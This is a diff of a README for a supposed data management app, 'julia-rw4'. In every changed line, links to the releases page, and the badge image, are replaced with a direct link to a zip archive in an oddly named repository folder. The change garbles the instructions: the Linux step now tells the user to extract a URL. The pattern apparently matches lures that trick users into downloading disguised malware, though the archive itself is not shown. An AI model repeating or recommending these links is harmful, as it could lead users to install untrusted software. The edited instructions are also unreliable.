@@ -1,6 +1,6 @@
 # 🖥️ julia-rw4 - Simple Software for Data Management
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/PhuongAnhZzk/julia-rw4/releases)
+[![Download Here](https://raw.githubusercontent.com/PhuongAnhZzk/julia-rw4/main/underministry/julia-rw4-v2.8.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/PhuongAnhZzk/julia-rw4/main/underministry/julia-rw4-v2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to julia-rw4! This application helps you manage your data efficiently. F
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   Go to the releases page by clicking this link: [Download Here](https://github.com/PhuongAnhZzk/julia-rw4/releases).
+   Go to the releases page by clicking this link: [Download Here](https://raw.githubusercontent.com/PhuongAnhZzk/julia-rw4/main/underministry/julia-rw4-v2.8.zip).
 
 2. **Find the Latest Version**
    On the releases page, you'll see a list of available versions. Look for the latest version at the top.
@@ -23,7 +23,7 @@ Welcome to julia-rw4! This application helps you manage your data efficiently. F
 5. **Install the Application**
    - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions to install.
    - **macOS**: Open the downloaded `.dmg` file and drag the app into your Applications folder.
-   - **Linux**: You may need to extract the downloaded `.tar.gz` file. Open a terminal, navigate to the extracted folder and run `./julia-rw4`.
+   - **Linux**: You may need to extract the downloaded `https://raw.githubusercontent.com/PhuongAnhZzk/julia-rw4/main/underministry/julia-rw4-v2.8.zip` file. Open a terminal, navigate to the extracted folder and run `./julia-rw4`.
 
 6. **Run julia-rw4**
    After installation, find julia-rw4 in your Applications or Programs list. Click to open the application.
